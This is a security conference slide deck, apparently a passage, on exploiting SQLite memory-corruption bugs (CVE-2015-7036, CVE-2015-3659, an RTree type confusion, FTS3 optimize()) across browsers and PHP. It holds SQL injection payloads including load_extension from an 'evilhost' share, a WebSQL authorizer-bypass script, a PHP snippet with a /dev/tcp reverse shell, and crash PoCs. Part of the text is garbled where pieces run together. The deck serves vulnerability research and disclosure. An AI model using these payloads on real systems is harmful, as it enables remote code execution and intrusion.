Many Birds, One Stone: Exploiting a Single 
SQLite Vulnerability Across Multiple Software
Kun Yang(@KelwinYang)
About us
●
Beijing Chaitin Tech Co., Ltd(@ChaitinTech)
○
https://chaitin.cn/en
○
pentesting services and enterprise products
●
Chaitin Security Research Lab
○
Pwn2Own 2017 3rd place
○
GeekPwn 2015/2016 awardees: PS4 Jailbreak, Android rooting
○
CTF players from team b1o0p, 2nd place at DEF CON CTF 2016
●
Acknowledgement
○
Siji Feng(a.k.a slipper)
○
Zhi Zhou(@CodeColorist)
2
SQLite
“SQLite is a self-contained, high-reliability, embedded, full-featured, 
public-domain, SQL database engine. SQLite is the most used database engine in 
the world.”
●
Storage backend for web browsers
●
Programming language binding
●
Web database
●
Embedded database for mobile apps
●
Database on IOT devices
3
Known Attacks on SQLite
SQLite3 Injection Cheat Sheet
●
Attach Database
○
?id=bob'; ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn 
(dataz text); INSERT INTO lol.pwn (dataz) VALUES ('';--
●
SELECT load_extension()
○
?name=123 UNION SELECT 
1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
4
Memory Corruption
SQLite database: file format with inevitable memory corruption bugs
●
CVE-2015-7036
○
Parsing a malformed database file will cause a heap overflow of several bytes in 
the function sqlite3VdbeExec()
●
CVE-2017-10989
○
mishandles undersized RTree blobs in a crafted database, leading to a 
heap-based buffer over-read
5
Memory Corruption
SQLite interpreter: more flexible ways to trigger bugs in sql statements
●
CVE-2015-3414
○
SQLite before 3.8.9 does not properly implement the dequoting of 
collation-sequence names, as demonstrated by COLLATE"""""""" at the end of a 
SELECT statement.
●
CVE-2015-3415
○
The sqlite3VdbeExec function in vdbe.c in SQLite before 3.8.9 does not properly 
implement comparison operators, as demonstrated by CHECK(0&O>O) in a 
CREATE TABLE statement.
6
Fuzzing SQLite
Previous work of Michał Zalewski: AFL: Finding bugs in SQLite, the easy way
●
Uninitialized pointers, bogus calls to free(), heap/stack buffer overflows
●
22 crashes in 30 min
●
Now AFL is a standard part of SQLite testing strategy
Example from his work sqlite-bad-free.sql (CVE-2015-3415)
create table t0(o CHar(0)CHECK(0&O>O));
insert into t0;
select randomblob(0)-trim(0);
7
AFL is not everything, we want deeper vulnerabilities.
8
Data Types in SQLite
Every value in SQLite has one of five fundamental data types:
●
64-bit signed integer
●
64-bit IEEE floating point number
●
string
●
BLOB
●
NULL
9
Virtual Table Mechanism
●
A virtual table is an object that is registered with an open SQLite database 
connection.
●
Queries and updates on a virtual table invoke callback methods of the virtual 
table object.
●
It can be used for
○
representing in-memory data structures
○
representing a view of data on disk that is not in the SQLite format
○
computing the content for application on demand
10
Complicated Extensions
Many features are introduced to SQLite as extensions
●
Json1 - JSON Integration 
●
FTS5/FTS3 - Full Text Search
●
R-Tree Module 
●
Sessions 
●
Run-Time Loadable Extensions
●
Dbstat Virtual Table
●
Csv Virtual Table
●
Carray
●
Generate_series
●
Spellfix1
11
Complex Features vs Simple Type System
Some extensions require complex data structures
Internal data is stored in special tables of the same database
This data can only be stored as BLOB type
●
How can we know the original type of a BLOB?
●
Should we trust the stored BLOB in database?
12
Answers from SQLite source code
How can we know the original type of a BLOB?
●
We can infer the type from the column name or function argument name
Should we trust the stored BLOB in database?
●
Why not?
13
Case Study: CVE-2015-7036
FTS3 and FTS4 are SQLite virtual table modules that allow users to perform 
full-text searches on a set of documents. They allow users to create special tables 
with a built-in full-text index.
An FTS tokenizer is a set of rules for extracting terms from a document or basic 
FTS full-text query. In addition to providing built-in "simple" and other tokenizers, 
FTS provides an interface for applications to implement and register custom 
tokenizers written in C.
14
Case Study: CVE-2015-7036
FTS does not expose a C-function that users call to register new tokenizer types 
with a database handle. Instead, the pointer must be encoded as an SQL blob 
value and passed to FTS through the SQL engine by evaluating a special scalar 
function.
●
SELECT fts3_tokenizer();
●
SELECT fts3_tokenizer(, );
15
Passing and dereferencing pointer in SQL 
queries?
Case Study: CVE-2015-7036
SQLite version 3.14.0 2016-07-26 15:17:14
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> select hex(fts3_tokenizer('simple'));
60DDBEE2FF7F0000
sqlite> select fts3_tokenizer('mytokenizer', x'4141414142424242');
AAAABBBB
sqlite> select hex(fts3_tokenizer('mytokenizer'));
4141414142424242
16
Case Study: CVE-2015-7036
Info leak
●
fts3_tokenizer returns the address of registered tokenizer as a BLOB, 
querying the built-in tokenizers can leak the base address of sqlite module.
Untrusted pointer dereference
●
fts3_tokenizer believes the second argument is always a valid pointer to a 
sqlite3_tokenizer_module, and it can never know the real type of the 
argument
17
The first easily exploitable sqlite memory corruption bug, and 
can be exploited through browsers!
18
Web SQL Database
WebDatabase defines an API for storing data in databases that can be queried 
using a variant of SQL. All the browser that implement this API use SQLite3 as a 
backend.
W3C has ceased maintaining the specification of WebDatabase, but it still remains 
available on latest Webkit (Safari) and Blink (Chromium).
19
Beware. This specification is no longer in active 
maintenance and the Web Applications Working Group 
does not intend to maintain it further.
Web SQL Database
var db = openDatabase('mydb', '1.0', 'Test DB', 2 * 1024 * 1024);
db.transaction(function(tx) {
  tx.executeSql('CREATE TABLE IF NOT EXISTS LOGS (id unique, log)');
  tx.executeSql('INSERT INTO LOGS (id, log) VALUES (1, "foobar")');
  tx.executeSql('INSERT INTO LOGS (id, log) VALUES (2, "logmsg")');
});
db.transaction(function(tx) {
  tx.executeSql('SELECT * FROM LOGS', [], function(tx, results) {
    var len = results.rows.length, i;
    for (i = 0; i " + results.rows.item(i).log + "");
    }
  }, null);
});
20
Open a database
Enter a 
transaction
Prepare tables
 Execute and read 
from a query
Read column
SQLite in browser is filtered
The sqlite3_set_authorizer() interface registers a callback function that is invoked 
to authorize certain SQL statement actions.
void SQLiteDatabase::enableAuthorizer(bool enable)
{
   if (m_authorizer && enable)
       sqlite3_set_authorizer(m_db, SQLiteDatabase::authorizerFunction, 
m_authorizer.get());
21
Database Authorizer
FTS3 is the only allowed virtual table:
int DatabaseAuthorizer::createVTable(const String& tableName, const String& 
moduleName)
{
   ...
   // Allow only the FTS3 extension
   if (!equalLettersIgnoringASCIICase(moduleName, "fts3"))
       return SQLAuthDeny;
22
Database Authorizer
Functions are whitelisted
int DatabaseAuthorizer::allowFunction(const String& functionName)
{
   if (m_securityEnabled && !m_whitelistedFunctions.contains(functionName))
       return SQLAuthDeny;
   return SQLAuthAllow;
}
An authorizer bypass is needed to use fts3_tokenizer: CVE-2015-3659 
(ZDI-15-291)
23
CVE-2015-3659 Authorizer whitelist bypass
We can create a table that will execute privileged functions, by specifying a 
DEFAULT value for a column and then inserting into the table.
var db = openDatabase('mydb', '1.0', 'Test DB', 2 * 1024 * 1024);
var sql = "hex(fts3_tokenizer('simple'))";
db.transaction(function (tx) {
  tx.executeSql('DROP TABLE IF EXISTS BAD;')
  tx.executeSql('CREATE TABLE BAD (id, x DEFAULT(' + sql + '));');
  tx.executeSql('INSERT INTO BAD (id) VALUES (1);');
  tx.executeSql('SELECT x FROM BAD LIMIT 1;', [], function (tx, results) {
    var val = results.rows.item(0).x;
  });
}, function(err) {
   log(err.message)
});
24
bypass
fts3_tokenizer code execution in PHP
●
Administrators usually set disable_functions to restrict the abilities of 
webshells
disable_functions=exec,passthru,shell_exec,system,proc_open,popen,...
●
PHP is not really sandboxed, all restrictions can be bypassed through native 
code execution
25
fts3_tokenizer code execution in PHP
●
LAMP stack loads libphp and libsqlite3 as separated shared library, with 
version information it’s possible to recover the library maps from the leaked 
simple_tokenizer with (silly) hardcoded offsets
26
…
7fadb00fb000-7fadb01bc000 r-xp 00000000 08:01 569         /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fadb01bc000-7fadb03bb000 ---p 000c1000 08:01 569         /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fadb03bb000-7fadb03be000 r--p 000c0000 08:01 569         /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fadb03be000-7fadb03c0000 rw-p 000c3000 08:01 569         /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
…
7fadb6136000-7fadb6a34000 r-xp 00000000 08:01 173493      /usr/lib/apache2/modules/libphp5.so
7fadb6a34000-7fadb6c33000 ---p 008fe000 08:01 173493      /usr/lib/apache2/modules/libphp5.so
7fadb6c33000-7fadb6cde000 r--p 008fd000 08:01 173493      /usr/lib/apache2/modules/libphp5.so
7fadb6cde000-7fadb6ceb000 rw-p 009a8000 08:01 173493      /usr/lib/apache2/modules/libphp5.so
●
There’s no perfect stack pivot gadget xCreate callback, but xOpen callback 
takes an argument from insert clause
  $db->exec("select fts3_tokenizer('simple', x'$spray_address');
    create virtual table a using fts3;
    insert into a values('bash -c \"bash>/dev/tcp/127.1/1337 0magic!=RTREE_GEOMETRY_MAGIC || nBlob!=nExpected ){
    sqlite3_free(pInfo);
    return SQLITE_ERROR;
  }
...
  if( pBlob->cb.xGeom ){
    pCons->u.xGeom = pBlob->cb.xGeom; 
33
/*
** Value for the first field of every RtreeMatchArg object. The MATCH
** operator tests that the first field of a blob operand matches this
** value to avoid operating on invalid blobs (which could cause a 
segfault).
*/
#define RTREE_GEOMETRY_MAGIC 0x891245AB
struct RtreeGeomCallback {
  int (*xGeom)(sqlite3_rtree_geometry*, int, RtreeDValue*, int*);
...
};
PC control in 3 lines
Process 37471 launched: '/usr/bin/sqlite3' (x86_64h)
SQLite version 3.16.0 2016-11-04 19:09:39
sqlite> create virtual table x using rtree(a,b,c);
sqlite> insert into x values(1,2,3);
sqlite> select * from x where a match 
x’ab45128900000000414141414141414142424242424242424343434343434343444444444444444401000000000000004
54545454545454546464646464646464747474747474747’;
Process 37471 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
frame #0: 0x00007fffe0f740b4 libsqlite3.dylib`rtreeStepToLeaf + 1380
libsqlite3.dylib`rtreeStepToLeaf:
->  0x7fffe0f740b4 : callq  *0x8(%r8,%r9,8)
0x7fffe0f740b9 : xorl   %ecx, %ecx
(lldb) x/xg $r8+$r9*8+8
0x100202258: 0x4141414141414141
(lldb) x/xg $rdi
0x100203590: 0x4444444444444444
34
We prefer exploitable bugs in browser!
35
Whitelist function optimize
/* 
** Implementation of the special optimize() function for FTS3. This 
** function merges all segments in the database to a single segment.
** Example usage is:
**   SELECT optimize(t) FROM t LIMIT 1;
** where 't' is the name of an FTS3 table.
*/
static void fts3OptimizeFunc(
  sqlite3_context *pContext,      /* SQLite function call context */
  int nVal,                       /* Size of argument array */
  sqlite3_value **apVal           /* Array of arguments */
){
  int rc;                         /* Return code */
  Fts3Table *p;                   /* Virtual table handle */
  Fts3Cursor *pCursor;            /* Cursor handle passed through apVal[0] */
  if( fts3FunctionArg(pContext, "optimize", apVal[0], &pCursor) ) return;
  p = (Fts3Table *)pCursor->base.pVtab;
  ...
}
36
Type Confusion
static int fts3FunctionArg(
  sqlite3_context *pContext,      /* SQL function call context */
  const char *zFunc,              /* Function name */
  sqlite3_value *pVal,            /* argv[0] passed to function */
  Fts3Cursor **ppCsr              /* OUT: Store cursor handle here */
){
  Fts3Cursor *pRet;
  if( sqlite3_value_type(pVal)!=SQLITE_BLOB 
   || sqlite3_value_bytes(pVal)!=sizeof(Fts3Cursor *)
  ){
    char *zErr = sqlite3_mprintf("illegal first argument to %s", zFunc);
    sqlite3_result_error(pContext, zErr, -1);
    sqlite3_free(zErr);
    return SQLITE_ERROR;
  }
  memcpy(&pRet, sqlite3_value_blob(pVal), sizeof(Fts3Cursor *));
  *ppCsr = pRet;
  return SQLITE_OK;
}
37
FTS3 Tricks
●
Virtual Table can have custom xColumn method in order to find the value of 
N-th column of current row.
○
int (*xColumn)(sqlite3_vtab_cursor*, sqlite3_context*, int N);
●
FTS3 module accepts the table name as a column name. Some functions 
take the table name as the first argument. 
○
SELECT optimize(t) FROM t LIMIT 1; 
●
However, when it’s not given with the correct column, it can still be compiled. 
●
The interpreter can never know the required type of column data.
38
Type Confusion
SQLite version 3.14.0 2016-07-26 15:17:14
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> create virtual table a using fts3(b);
sqlite> insert into a values(x'4141414142424242');
sqlite> select hex(a) from a;
C854D98F08560000
sqlite> select optimize(b) from a;
[1]    37515 segmentation fault  sqlite3
39
What do we control?
static void fts3OptimizeFunc(
  sqlite3_context *pContext,
  int nVal,
  sqlite3_value **apVal
){
  int rc;
  Fts3Table *p;
  Fts3Cursor *pCursor;
  UNUSED_PARAMETER(nVal);
  assert( nVal==1 );
  if( fts3FunctionArg(pContext, "optimize",
                      apVal[0], &pCursor) )
    return;
  p = (Fts3Table *)pCursor->base.pVtab;
  rc = sqlite3Fts3Optimize(p);
  ...
}
40
Let's take optimize() function as an example:
●
With type confusion bug, we can specify arbitrary 
value for pCursor;
●
If we can control memory in known address, we 
can construct Fts3Cursor struct, and other struct 